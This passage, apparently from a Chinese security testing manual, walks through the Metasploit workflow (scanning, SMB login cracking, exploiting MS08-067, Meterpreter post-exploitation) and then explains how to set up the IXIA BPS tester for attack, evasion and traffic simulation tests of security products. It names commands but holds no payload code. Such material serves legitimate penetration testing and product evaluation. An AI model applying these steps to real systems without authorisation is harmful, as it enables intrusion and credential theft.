+-c 选项提供输出过滤：
+ 
+Metasploit内建的端口扫描器，如：
+ 
+内建的端口扫描器在辅助进行渗透攻击方面更有优势，比如跳板攻击。
+针对性的扫描：寻找目标网络中存在的已知可利用漏洞或能够轻松获取后门的特定系统、软件或配置缺陷。目的更明确，风险更小，更快速
+ 
+2、漏洞扫描
+漏洞扫描器向目标系统发送数据，并将反馈数据与自带的漏洞特征库进行匹配，进而列举出目标系统上存在的安全漏洞。也可以将不同系统独特的响应当成目标的指纹来确定OS版本，甚至补丁安装等级。
+扫描工具：NeXpose、Nessus、专用漏洞扫描器
+Nessus扫描报告界面：
+ 
+专用漏洞扫描： 在网络上查找某个特定的漏洞时，可以借助Metasploit自带的辅助模块完成，如下为两个例子：
+借助smb_login模块对主机的登录账号进行破解
+ 
+借助smap的漏洞扫描脚本扫描smb漏洞：
+ 
+3、渗透攻击
+经历了前面的几个阶段，我们对目标系统版本、运行的软件服务和存在的漏洞有了比较清晰的把握，下面就可以在msfconsole发起攻击了。依次用到的几个命令有：
+show exploits
+显示Metasploit框架中所有可用的渗透攻击模块，一般需要针对前面扫描发现的安全漏洞来实施相应的渗透攻击。这个列表会随着更新越来越多。确定攻击模块后使用use命令来加载，加载成功后终端提示符会变化：
+ 
+show auxiliary
+显示所有的辅助模块以及它们的用途，辅助模块用途广泛，可以是扫描器、拒绝服务攻击工具、fuzz测试器或其他类型的工具。
+show payloads
+use选中模块后，在当前模块的命令提示符下输入show payloads会将与当前模块兼容的攻击载荷显示出来。在针对基于windows操作系统的攻击中，简单的攻击载荷可能只会返回目标主机的一个命令行页面，复杂的能够返回一个完整的图形操作界面。
+ 
+确定攻击载荷后可以用set命令来选中：
+ 
+show options
+Options参数是保证Metasploit框架中各个模块正常运行所需的各种设置，当你选择了一个模块，并输入msf>show options后，会列出这个模块所需的各种参数。此外，攻击载荷可能也需要参数，选中payloads后show options能看到一些额外的参数。
+ 
+show targets
+显示受漏洞影响的目标系统的类型，如下显示了受ms08-067漏洞影响的部分操作系统版本，Auto Targeting通过攻击模块提取目标系统的指纹信息来自动选择操作系统进行攻击，但一般最好还是通过人工指定来避免出错。
+ 
+search
+search命令用来查找某个特定的渗透攻击、辅助或攻击载荷模块，比如查找与MS08-067漏洞相关的模块：
+ 
+info
+info+模块名可以显示模块的详细信息、参数说明和所有可用的目标操作系统，如果已经选择了某个模块，直接在该模块的提示符下输入info即可：
+ 
+set/unset
+set可以对Metasploit模块中的某个参数进行设置并启用，unset可以禁用相关参数。
+exploit
+当相关设置完成后，exploit命令用来初始化攻击环境并开始对目标进行攻击尝试。攻击成功后，会根据选择的payloads来返回不同的内容，比如说返回一个reverse_tcp方式的Meterpreter攻击载荷会话。
+下图展示了一个典型的渗透攻击流程中msf的使用：
+① 扫描服务和漏洞，确定操作系统类型并发现MS08-067: VULNERABLE
+ 
+ 
+② 选择攻击模块和攻击载荷并设置参数
+ 
+ 
+③ 执行攻击
+ 
+攻击成功后提示Meterperter session 1 opened，sessions –l可以查看Meterperter会话的详细信息，sessions –I 1命令让我们能够与id为1的控制会话进行交互，这时我们进入了Meterpreter的交互shell中，如果控制会话是一个反向连接命令行shell，这个命令会直接把我们带到命令提示符状态下，最后我们输入shell进入目标系统的交互命令行shell中，到此主机已经被我们攻陷了。
+后渗透攻击
+后渗透攻击阶段的利器—Meterpreter。Meterpreter是Metasploit框架的一个扩展模块，通常作为溢出的攻击载荷使用，在触发漏洞后能返回一个控制通道（Meterpreter Shell连接），可以调用Metasploit的一些功能，对目标系统进行更为深入的渗透，包括跳板攻击、特权提升、反追踪、密码哈希值获取等等。
+Meterpreter基本命令：
+成功入侵系统并获得系统的Meterpreter会话后，可以利用一些基本的Meterpreter命令来收集更多的信息，比如有：
+Screenshot：获取活动用户的的桌面截屏
+ 
+Sysinfo
+ 
+3.11	BPS测试仪
+BPS测试仪是IXIA推出了l2-l7层安全测试仪，除了传统的在l2~l3层的测试功能外，BPS更侧重在l4~l7层的测试功能使用。可以灵活的构造模拟各种realworld的流量，有丰富的攻击特征库可以模拟大量的威胁攻击流量，同时支持多种攻击逃逸的方法，可谓是安全防护产品测试的一把利器。
+3.11.1	BPS 界面的登录
+1、BPS测试仪提供B/S的管理架构，可直接在浏览器中输入设备的管理口地址进行登陆：
+2、点击红框中的图标，打开 BPS 的主要操作界面 
+
+3.11.2	端口的占用
+1、点击右上角的红框位置，打开机框图
+2、如下图所示我们可以看到这是一台 8 口的 1GE/10GE 双速率的 PerfectStorm 设备
+
+3.只需要在希望的端口上点击鼠标左键进行选择，就会发现端口出现图中的样子，代表已经被选中。BPS 的端口序号是从 0 开始，所以 8 个端口的序号分别为 0~7。图中 0:1 中的 1 代表的是逻辑 1 号端口，这个逻辑 1 端口与后面创建 Neighborhood 中的 Interface1 直接对应，软件会根据使用者先点击哪个端口便赋予该端口为逻辑端口1。假设图中先点击4 端口，则会显示成为 4:1。
+ 
+
+4. BPS 的端口资源汇聚功能很简单，只需要将多个端口都选择上，假如后面在测试的过程中只使用了两个端口，这时BPS 会默认的把其他端口的资源都汇聚给使用的两个口
+
+ 
+3.11.3	Network Neighborhood 的配置
+Neighborhood 在 BPS 的软件中最主要的作用是给测试的端口赋予 IP 地址，除此之外还有类似 IPSEC，NAT，GTP 等其他协议栈的堆栈的配置也是在这里配置
+在 BPS 的主界面上点击Control Center 中的 New Neighborhood
+ 
+新的界面中左侧只是提供了一些快捷模板，例如被测设备是透明模式（只有二层转发），这样测试仪模拟的端口就需要都在同一个subnet 之下，同网段就可以通信。
+ 
+假如选择 Router，代表被测设备为路由模式，这样测试仪模拟的端口就需要属于不同的 subnet。但是，其实这系列的组网都是可以通过 Switch 的模式中修改配置转换过来，并不一定只能选择其中一个。
+ 
+ 
+选择  Switch，然后点击右下角的Create，给新创建的模板起个名字，点击OK
+ 
+在新的界面中，我们首先看到红框部分，这里的 1 和 2 就代表了之前占用端口部分中的逻辑端口 1 和 2，所以 BPS 是这样去匹配硬件物理端口的
+ 
+ 
+展开 IPv4 Static Host，可以根据需要，去修改 IP 地址的起始值、个数、网关、掩码等信息，点击右下角的save 进行保存
+具体的某一段的 IP 地址段是赋予哪个逻辑端口，我们可以通过截图部分中的 Container下拉框去选择
+ 
+ 
+点击 Add Row，增加了新的一个地址段，该段地址的起始地址为 1.3.0.1，个数为 100，网关为 1.0.0.1，掩码为 8。在这里，我们把这个地址段赋予给了 Interface1，这时，Interface1就会拥有两段不同的 IP 地址段。在这里还需要特别留意 Tags 这个标志位，因为后续具体哪个地址段仿真Client 和 Server，就会选择相应的 Tags 中的名称来决定。
+ 
+如果需要增加新的逻辑端口 Interface、vlan 等信息，可以如图的位置去选择
+ 
+ 
+如果需要增加其他协议堆栈，比如 IPv6 等，可以从如截图的位置去选择，用法和 IPv4的一致
+ 
+3.11.4	Security 组件的测试使用
+BPS测试仪有一个包含威胁攻击库，涵盖了往年比较典型的威胁漏洞，常用来做安全防护产品的攻击检测测试。下面来介绍下BPS测试仪security组件的使用要点：
+参照章节二的端口占用以及章节三中的 1~6 步完成 Neighborhood 的创建
+1、点击 Manager-Strike Lists
+2、点击右下角的Create New 创建一个新的威胁攻击列表
+3、点击右下角的 Add Strike，在弹出的窗口中可以看到目前所使用的设备中包含的威胁攻击库的个数，目前截图的设备包含 38840 种
+ 
+ 
+4、点击开任意一个威胁攻击，可以看到它的名称和简单描述，并且在上面有标称他们属于哪种类型的协议以及攻击方向。同样也会列出该威胁攻击所被标识的CVE,BID 等编号
+
+5、在大量的威胁攻击中搜索到自己需要的可以通过 BPS 提供的 Advanced 过滤目标，在这里通过输入自己的过滤条件，比如威胁漏洞发布的年份，严重程度，所属协议，cve编号，漏洞类型（通过keyword过滤）等就可以搜索出需要的威胁列表，
+ 
+ 
+6、根据需要将需要发送的威胁添加进右侧的列表中，点击 ok
+7、这时在 Strike List 中添加进了需要使用的威胁攻击，点击save 进行保存
+8、点击Test-NewTest，创建一个新的测试
+9、首先在Network Neighborhood 中把第一步中创建好的给引入进来
+ 
+10、在 Test Components 中点击 Add new，选择 Security，点击 Select
+给新创建的 Security Component 起个名称
+ 
+
+11、单击或者点击右侧的编辑进入该 Component
+ 
+12、根据Neighborhood的配置去选定client和server对应的Tags的值
+ 
+ 
+13、选择 Strike List 右侧的编辑按钮，在弹出的对话框中输入之前创建好的威胁攻击列表，进行引入
+ 
+14、如果有攻击逃逸测试需求，同样可以在此处引用新建的攻击逃逸模板，如上图所示
+BPS测试仪当前支持网络层，传输层，应用层特定的一些协议负载的逃逸，比如ip分片，分片重叠，特殊字段重写，tcp分段，tcp分段重叠，tcp报文乱序，http负载编码，udp变端口，sumrpc协议逃逸，smtp协议逃逸等等
+ 
+
+15、点击右下角Return to Test Workspace返回到测试主页面，再点击右下角的 Save and Run，给新创建的测试例起个名称，就可以开始测试了
+ 
+
+16、在运行测试完毕以后，我们可以在 Attacks 的统计窗口观察具体测试统计，因为目前是B2B  的测试环境，没有被测设备在中间，所以仿真的威胁攻击都没有被阻断，所以截图中 Total Allowed=4，而且因为没有防御成功，所以测试结果显示失败。正常情况下如果防御阻断成功，在相应的位置会有阻断的个数显示。
+ 
+17、点击左下角的 Report 按钮，跳转至测试结果详细统计窗口
+
+  
+18、在这里，我们可以通过展开左侧的列表，详细的看到具体的哪些攻击威胁被允许通过了，哪些威胁攻击被阻断成功了
+ 
+
+3.11.5	Application Simulator 组件的测试使用
+BPS  是一个非常灵活的软件，我们可以通过手工去创建自己想要的应用层协议，并且对该协议的内容进行手工定义，从而构造我们想要的流量报文，可以通过这种方式定义匹配特征的攻击报文，下面介绍一下通过BPS测试仪自定义应用层流量的方法。
+
+1、参照章节二的端口占用以及章节三中的 1~6 步完成 Neighborhood 的创建
+2、点击 Managers-Super flows
+3、Superflow 在 BPS 软件中可以定义为应用层内容库，在这里会存有 BPS 内置的大量应用层协议模板，也会保存用户自己平时手工添加的应用层配置。先点击 Create New 去创建自己的应用层配置
+4、点击截图中的 Add Flow 位置，这里是先确定你需要添加的协议种类
+ 
+ 
+5、在新的截图中会显示目前 BPS 所支持的所以协议种类，可以通过搜索来添加自己希望创建的协议，在这里举例搜索 HTTP，添加一个 HTTP 协议
+ 
+6、通过展开，可以看到 HTTP 所支持的通用协议参数都可以在这里去修改
+ 
+ 
+
+7、点击截图位置中的 Add Action，这里是添加该协议中定义的动作，比如 HTTP 协议中会有 GET，PUT，POST 等
+ 
+8、先添加一个 GET 动作，在这里的 Source 指的是由Client 发起的动作
+ 
+ 
+9、再添加一个 2000K 的Response，这里的 Source 则是由 Server 端发起
+ 
+ 
+
+10、通过展开，我们可以发现GET 动作所定义协议的字段和response里面的字段都是开放可以修改的
+ 
+
+11、如下图所示，Response 可以直接定义回复的响应大小，这里填写的值会回复 22k 的大小
+ 
+13、Response 也可以回复真实的文件，可以使用 BPS 内置的文件，可以通过右侧的上传符号去上传本地文件进行回复
+ 
+14、根据需要填写完参数以后点击save 进行保存
+15、现在再点击 Managers-Application Profiles
+16、点击Create New 去创建一个新的 Application Profiles，Application Profiles 可以理解为单个或多个 Superflow 的集合
+17、新界面中点击 Add Superflow
+ 
+18、通过搜索刚才手工创建的 Superflow 名称，点击 ok
+ 
+19、如果需要做混合应用层测试，可以使用同样的步骤添加不同的混合协议，这些协议可以自己手工添加制作，也直接调用 BPS 里面内置的模板
+20、不同的协议之间我们还可以通过调整 Weight 值去控制不同协议之间的带宽比例。
+ 
+21、点击Test-NewTest，创建一个新的测试
+22、首先在Network Neighborhood 中把第一步中创建好的给引入进来
+23、在 Test Components 中点击 Add new，然后选择中第一个 Application Simulator
+ 
+24、单击新创建的Component 或者点击右侧的编辑按钮
+25、在新的界面中，首先红框中的 Client Tags 和 Server Tags 所指定的就是在 Neighborhood章节中提及的 IPv4 Static Host 中给每一段IP 所编辑的 Tags，通过这里的设定来确定哪段 IP是用于 Client 和 Server，再由这段 IP 在配置中 Container 设定的 Interface 值来确定由哪个逻辑端口仿真Client 和 Server，最终再根据占用端口的地方来确定由哪个真实的硬件端口去仿真Client 和 Server
+ 
+ 
+26、点击右上方的 Edit Load Profile 去进行测试时长的配置
+ 
+27、默认情况下会存在三个阶段，上升建立期、稳定传输期和下降关闭期
+ 
+28、通过点击右下方的 Create New/Browse 可以查看更多选项
+选择 StairStep
+ 
+ 
+
+在这个模板中，我们可以设定一个阶段性爬坡的动作，比如被测场景为仿真阶段爬坡的过程，我们可以通过该模板去设定。日股在这个图中的爬坡动作的含义为，起始的新建值为1000，然后每 10 秒钟，新建的值增加 1000，即 11 秒时为 2000,21 秒时为 3000，以此类推逐步增加，最终新建值增加到 10000 后维持在这个数值
+ 
+
+选择Custom
+
+ 
+ 
+里面有大量的模板可以引用，也可以点击 New 创建一个
+默认情况下与之前的一样，分为三个阶段
+ 
+可以添加右侧的加号，对中间的稳定阶段增加多个阶段，可以让吞吐量逐渐的增加，也可以根据需要设定忽高忽低的吞吐量，去仿真更加真实的现网
+ 
+29、在截图位置引入之前创建好的 Application Profiles
+ 
+30、如下截图位置是配置最为重要的三个具体值
+ 
+
+31. 返回主界面，点击右下角的 Save and Run，给该测试例起个名称
+32、在运行的过程中可以观察测试结果
+ 
+ 
+33、测试完毕后会出现结果提示
+ 
+
